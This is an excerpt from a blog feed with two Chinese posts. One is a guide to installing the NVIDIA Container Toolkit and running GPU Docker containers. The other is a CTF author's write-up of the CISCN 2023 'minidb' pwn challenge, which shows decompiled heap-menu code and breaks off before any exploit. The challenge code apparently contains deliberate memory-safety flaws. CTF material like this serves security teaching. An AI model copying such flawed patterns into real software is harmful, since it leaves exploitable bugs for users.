Toolk</h2><p>有两种方法：</p><h4 id="方法-①"><a href="#方法-①" class="headerlink" title="方法 ①"></a>方法 ①</h4><p>需要在服务器主机上完成，首先使用如下命令安装基本组件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update \</span><br><span class="language-bash">    &amp;&amp; sudo apt-get install -y nvidia-container-toolkit-base</span><br></code></pre></td></tr></table></figure><p>使用如下命令检查是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">nvidia-ctk --version</span><br></code></pre></td></tr></table></figure><p>接下来使用如下命令生成 CDI （Container Device Interface）规范文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk cdi generate --output=/etc/cdi/nvidia.yaml</span><br></code></pre></td></tr></table></figure><p>添加 NVIDIA 仓库与 GPG 密钥：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>) \</span><br><span class="language-bash">      &amp;&amp; curl -fsSL https://nvidia.github.io/libnvidia-container/gpgkey | sudo gpg --dearmor -o /usr/share/keyrings/nvidia-container-toolkit-keyring.gpg \</span><br><span class="language-bash">      &amp;&amp; curl -s -L https://nvidia.github.io/libnvidia-container/<span class="hljs-variable">$distribution</span>/libnvidia-container.list | \</span><br><span class="language-bash">            sed <span class="hljs-string">&#x27;s#deb https://#deb [signed-by=/usr/share/keyrings/nvidia-container-toolkit-keyring.gpg] https://#g&#x27;</span> | \</span><br><span class="language-bash">            sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-container-toolkit.list</span><br></code></pre></td></tr></table></figure><p>安装 toolkit：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install -y nvidia-container-toolkit</span><br></code></pre></td></tr></table></figure><p>配置 docker daemon 进程以识别 NVIDIA COntainer Runtime：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>测试是否安装成功：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo docker run --<span class="hljs-built_in">rm</span> --runtime=nvidia --gpus all nvidia/cuda:11.6.2-base-ubuntu20.04 nvidia-smi</span><br></code></pre></td></tr></table></figure><p>最后成功输出和 <code>nvidia-smi</code> 命令一样的结果就说明安装成功了：</p><p><img src="https://s2.loli.net/2023/08/31/6BVStUv9jeCuimM.png" alt="image.png"></p><h4 id="方法-②"><a href="#方法-②" class="headerlink" title="方法 ②"></a>方法 ②</h4><blockquote><p>参见 <a href="https://github.com/NVIDIA/nvidia-docker/issues/1238">Github 上的这个 issue</a></p></blockquote><p>若方法 ① 没法成功进行，可以使用如下命令进行安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">distribution=$(. /etc/os-release;<span class="hljs-built_in">echo</span> $ID<span class="hljs-variable">$VERSION_ID</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/gpgkey | sudo apt-key add -</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">curl -s -L https://nvidia.github.io/nvidia-docker/<span class="hljs-variable">$distribution</span>/nvidia-docker.list | sudo <span class="hljs-built_in">tee</span> /etc/apt/sources.list.d/nvidia-docker.list</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get update &amp;&amp; sudo apt-get install -y nvidia-container-toolkit</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h2 id="添加-NVIDIA-Rumtime"><a href="#添加-NVIDIA-Rumtime" class="headerlink" title="添加 NVIDIA Rumtime"></a>添加 NVIDIA Rumtime</h2><p>NVIDIA Container Runtime 的添加一共有三种方法</p><h4 id="方法-①-1"><a href="#方法-①-1" class="headerlink" title="方法 ①"></a>方法 ①</h4><p>首先创建配置文件夹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">mkdir</span> -p /etc/systemd/system/docker.service.d</span><br></code></pre></td></tr></table></figure><p>然后创建配置文件，注意这条命令一共有五行，全部复制后粘贴进去：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo <span class="hljs-built_in">tee</span> /etc/systemd/system/docker.service.d/override.conf &lt;&lt;<span class="hljs-string">EOF</span></span><br>[Service]<br>ExecStart=<br>ExecStart=/usr/bin/dockerd --host=fd:// --add-runtime=nvidia=/usr/bin/nvidia-container-runtime<br>EOF<br></code></pre></td></tr></table></figure><p>重启 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl daemon-reload &amp;&amp; sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="方法-②-1"><a href="#方法-②-1" class="headerlink" title="方法 ②"></a>方法 ②</h4><p>Nvidia toolkit 安装成功之后也可以辅助我们完成这一步，通过如下两条命令其中之一完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo nvidia-ctk runtime configure --runtime=docker --set-as-default <span class="hljs-comment"># 设置为默认</span></span><br></code></pre></td></tr></table></figure><p>重启 docker：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl restart docker</span><br></code></pre></td></tr></table></figure><h4 id="方法-③"><a href="#方法-③" class="headerlink" title="方法 ③"></a>方法 ③</h4><p>也可以使用 docker 直接添加 NVIDIA Runtime：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo dockerd --add-runtime=nvidia=/usr/bin/nvidia-container-runtime [...]</span><br></code></pre></td></tr></table></figure><h2 id="配置带-CUDA-的-docker-镜像"><a href="#配置带-CUDA-的-docker-镜像" class="headerlink" title="配置带 CUDA 的 docker 镜像"></a>配置带 CUDA 的 docker 镜像</h2><h2 id="创建并启动带显卡的-Docker-容器"><a href="#创建并启动带显卡的-Docker-容器" class="headerlink" title="创建并启动带显卡的 Docker 容器"></a>创建并启动带显卡的 Docker 容器</h2><p>与 <code>0x01</code> 中的创建 docker 容器的步骤基本相同，不过需要添加额外的参数</p><blockquote><p>更多用法参见 <a href="https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.html%EF%BC%8C%E6%9C%AC%E6%96%87%E4%BB%85%E5%B1%95%E7%A4%BA%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/user-guide.html，本文仅展示基本用法</a></p></blockquote><h3 id="使用-Nvidia-Runtime"><a href="#使用-Nvidia-Runtime" class="headerlink" title="使用 Nvidia Runtime"></a>使用 Nvidia Runtime</h3><ul><li>容器内挂载所有的显卡</li></ul><p>通过额外添加 <code>--runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all</code> 参数完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=all 自定义镜像名</span><br></code></pre></td></tr></table></figure><ul><li>容器内挂载指定显卡</li></ul><p>通过额外添加 <code>--runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=显卡标号</code> 参数完成，其中显卡标号为 <code>nvidia-smi -L</code> 命令中所展示的序号，挂载多张显卡需要用 <code>,</code> 进行隔离（<strong>显卡标号间不要加空格</strong> ），这里以挂载第一、二张显卡为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=0,1 自定义镜像名</span><br></code></pre></td></tr></table></figure><h3 id="传统用法"><a href="#传统用法" class="headerlink" title="传统用法"></a>传统用法</h3><ul><li>容器内挂载所有的显卡</li></ul><p>额外添加 <code>--gpus all</code> 参数即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --gpus all 自定义镜像名</span><br></code></pre></td></tr></table></figure><ul><li>容器内挂载指定显卡</li></ul><p>通过额外添加 <code>--gpus=&#39;&quot;device=显卡标号&quot;&#39;</code> 参数完成，其中显卡标号为 <code>nvidia-smi -L</code> 命令中所展示的序号，以下命令以第一张显卡为例：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">docker run -d --privileged -p <span class="hljs-string">&quot;外部端口:22&quot;</span> -h <span class="hljs-string">&quot;容器主机名&quot;</span> --name=<span class="hljs-string">&quot;容器名&quot;</span> --gpus=<span class="hljs-string">&#x27;&quot;device=0&quot;&#x27;</span> 自定义镜像名</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;怎么实验室只有👴一个运维&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="Docker" scheme="https://arttnba3.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>【CTF.0x09】CISCN 2023 华东北分区赛 minidb、kkk 出题手记</title>
    <link href="https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/"/>
    <id>https://arttnba3.github.io/2023/07/14/CTF-0X09_CISCN_2023_HDBFQS/</id>
    <published>2023-07-13T23:43:35.000Z</published>
    <updated>2023-12-18T06:58:40.869Z</updated>
    
    <content type="html"><![CDATA[<p>典中典之低质量套路 Pwn 题集合</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>第一次帮国赛出题（<del>主要是听说有💴恰</del>），不出意外的话应该也是本科阶段最后一次出 CTF Pwn 题目了，同时这也是笔者第一次出 AWDP 的题目，感觉还是有点意思的 ：）</p><p>因为短时间内确实是想不出什么新东西了所以出了两道比较套路化的题目，可惜解题率似乎有点不尽人意，估计大佬们应该都不屑于做笔者出的烂题吧 :（</p><h1 id="0x01-minidb（简单）"><a href="#0x01-minidb（简单）" class="headerlink" title="0x01. minidb（简单）"></a>0x01. minidb（简单）</h1><p>这道题出题时的难度设置便是 <code>简单</code> ，所以笔者是按照签到题的难度去出的，不过虽然成功 <code>fix</code> 的队伍不少，但是成功 <code>break</code> 的队伍似乎并如预期不多🤔（<del>修都修了打还不会打🐎，你们是不是偷偷藏了什么👴不知道的通防手段</del>）</p><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先还是惯例修个跳表：</p><p><img src="https://s2.loli.net/2023/07/07/VpuMXz3L9vFgiRC.png" alt="IDA 修复跳表.png"></p><p>提供了两层堆菜单，第一层可以让用户创建、使用、删除、展示、重命名数据库：</p><p><img src="https://s2.loli.net/2023/07/12/tbZT75vorwOKMnj.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1547</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v3 = <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_139F();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>    v2 = v1;<br>    <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">5</span> )<br>    &#123;<br>LABEL_6:<br>      <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>        <span class="hljs-keyword">continue</span>;<br>LABEL_15:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid choice!\x1B[0m&quot;</span>);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( (<span class="hljs-type">int</span>)v2 &lt;= <span class="hljs-number">0</span> || v2 &gt; <span class="hljs-number">5</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_15;<br>    <span class="hljs-keyword">switch</span> ( v2 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">0u</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_15;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1u</span>:<br>        sub_1D38();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2u</span>:<br>        v3 = sub_2080();<br>        <span class="hljs-keyword">if</span> ( v3 )<br>          sub_1451(v3);<br>        v3 = <span class="hljs-number">0LL</span>;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3u</span>:<br>        sub_21C1();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4u</span>:<br>        sub_23EA();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5u</span>:<br>        sub_247F();<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">goto</span> LABEL_6;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v2 != <span class="hljs-number">666</span> );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;See you next time~&quot;</span>);<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中数据库的创建会分配两个 chunk，一个用作数据库本体，另一个用作数据库的名字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 <span class="hljs-title function_">sub_1D38</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+0h] [rbp-130h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+4h] [rbp-12Ch]</span><br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [rsp+8h] [rbp-128h]</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-124h]</span><br>  <span class="hljs-type">void</span> **v5; <span class="hljs-comment">// [rsp+10h] [rbp-120h]</span><br>  <span class="hljs-type">void</span> *ptr; <span class="hljs-comment">// [rsp+18h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> s2[<span class="hljs-number">264</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v8; <span class="hljs-comment">// [rsp+128h] [rbp-8h]</span><br><br>  v8 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( !dword_6088 )<br>    dword_6088 = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( dword_608C &lt;= <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !qword_6060[i] )<br>      &#123;<br>        v5 = (<span class="hljs-type">void</span> **)&amp;qword_6060[i];<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    ptr = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1uLL</span>, <span class="hljs-number">0x810</span>uLL);<br>    <span class="hljs-keyword">if</span> ( ptr )<br>    &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the name of database: &quot;</span>);<br>      __isoc99_scanf(<span class="hljs-string">&quot;%255s&quot;</span>, s2);<br>      <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt;= <span class="hljs-number">4</span>; ++j )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( qword_6060[j] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(*(<span class="hljs-type">const</span> <span class="hljs-type">char</span> **)(qword_6060[j] + <span class="hljs-number">8LL</span>), s2) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] There&#x27;s already another database with the same name!\x1B[0m&quot;</span>);<br>          <span class="hljs-keyword">goto</span> LABEL_24;<br>        &#125;<br>      &#125;<br>      v4 = <span class="hljs-built_in">strlen</span>(s2);<br>      *((_QWORD *)ptr + <span class="hljs-number">1</span>) = <span class="hljs-built_in">malloc</span>(v4 + <span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">if</span> ( *((_QWORD *)ptr + <span class="hljs-number">1</span>) )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>(*((<span class="hljs-type">char</span> **)ptr + <span class="hljs-number">1</span>), s2);<br>        *(_BYTE *)(*((_QWORD *)ptr + <span class="hljs-number">1</span>) + v4) = <span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Now you can set the type of your databse. Here&#x27;s available choices:&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1. int32 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2. int64 to str[128]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3. int32 to str[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;4. int64 to strr[256]&quot;</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;(Note that the string should end with a &#x27;\\0&#x27;, so the max length of input is 127/255)&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Please input the type of database: &quot;</span>);<br>        __isoc99_scanf(<span class="hljs-string">&quot;%u&quot;</span>, &amp;v1);<br>        <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">4</span> &amp;&amp; v1 )<br>        &#123;<br>          *(_DWORD *)ptr = v1;<br>          *v5 = ptr;<br>          ++dword_608C;<br>          <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Succesfully create a new database with name \&quot;%s\&quot;!\n&quot;</span>, s2);<br>          <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Invalid type of database!\x1B[0m&quot;</span>);<br>        <span class="hljs-built_in">free</span>(*((<span class="hljs-type">void</span> **)ptr + <span class="hljs-number">1</span>));<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db name!\x1B[0m&quot;</span>);<br>      &#125;<br>LABEL_24:<br>      <span class="hljs-built_in">free</span>(ptr);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] Failed to allocate space for db!\x1B[0m&quot;</span>);<br>    &#125;<br>    *v5 = <span class="hljs-number">0LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] You&#x27;ve already got too many databases!\x1B[0m&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v8;<br>&#125;<br></code></pre></td></tr></table></figure><p>第二层堆菜单则提供了对数据库内键值对数据的增加、查询、更新、删除操作：</p><p><img src="https://s2.loli.net/2023/07/12/yEmj24xGUVwt7Os.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> __int64 __fastcall <span class="hljs-title function_">sub_1451</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    sub_13FE();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Your choice: &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    v3 = v2;<br>    <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">666</span> )<br>      <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">666</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">4</span> )<br>      &#123;<br>        sub_1C47(a1);<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">4</span> )<br>      &#123;<br>        <span class="hljs-keyword">switch</span> ( v3 )<br>        &#123;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            sub_1A81(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            sub_1712(a1);<br>            <span class="hljs-keyword">continue</span>;<br>          <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            sub_19BD(a1);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\x1B[31m\x1B[1m[x] 